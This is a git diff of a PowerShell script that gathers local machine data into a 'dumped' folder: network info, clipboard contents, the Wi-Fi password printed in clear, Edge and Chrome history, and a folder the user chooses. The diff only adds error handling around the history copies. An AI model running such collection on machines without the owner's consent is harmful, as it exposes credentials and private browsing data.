@@ -3,6 +3,8 @@ mkdir dumped/edge -Force #All the MS edge data is stored here.
 mkdir dumped/chrome -Force #All Google Chrome data is stored here.
 mkdir dumped/wantedfolder -Force #Desired Path contents are stored here.
 
+$ErrorActionPreference="Stop" #Makes any Errors stop the program.
+
 #below is just standard system and network info.
 arp -a > dumped/iplist.txt 
 ipconfig > dumped/ipconfig.txt 
@@ -16,15 +18,26 @@ Get-Clipboard > dumped/clipboard.txt
 $networkname=Get-NetConnectionProfile | Select-Object -ExpandProperty Name
 Netsh wlan show profile name=$networkname key=clear > dumped/networkinfo.txt
 
-#This command copies edge history data to dumped/edge
-$origin_edge_path="C:\Users\$Env:UserName\AppData\Local\Microsoft\Edge\User Data\Default\History"
-$edgehistorycopypath="dumped\edge"
-Copy-Item -Path $origin_edge_path -Destination $edgehistorycopypath -Force -ErrorAction SilentlyContinue
+try {
+    #This command copies edge history data to dumped/edge
+    $origin_edge_path="C:\Users\$Env:UserName\AppData\Local\Microsoft\Edge\User Data\Default\History"
+    $edgehistorycopypath="dumped\edge"
+    Copy-Item -Path $origin_edge_path -Destination $edgehistorycopypath -Force
+}
+catch {
+    Write-Host "Edge Is not installed on this device."
+}
 
-#This command copies chrome history data to dumped/chrome.
-$origin_chrome_path="C:\Users\$Env:UserName\AppData\Local\Google\Chrome\User Data\Default\History"
-$chromehistorycopypath="dumped\chrome"
-Copy-Item -Path $origin_chrome_path -Destination $chromehistorycopypath -Force -ErrorAction SilentlyContinue
+
+try {
+    #This command copies chrome history data to dumped/chrome.
+    $origin_chrome_path="C:\Users\$Env:UserName\AppData\Local\Google\Chrome\User Data\Default\History"
+    $chromehistorycopypath="dumped\chrome"
+    Copy-Item -Path $origin_chrome_path -Destination $chromehistorycopypath -Force
+}
+catch {
+    Write-Host "Google Chrome is not installed on this device."
+}
 
 #Asks user for desired path to copy and then copies it and its contents.
 Write-Output "Write your desired path to copy:"
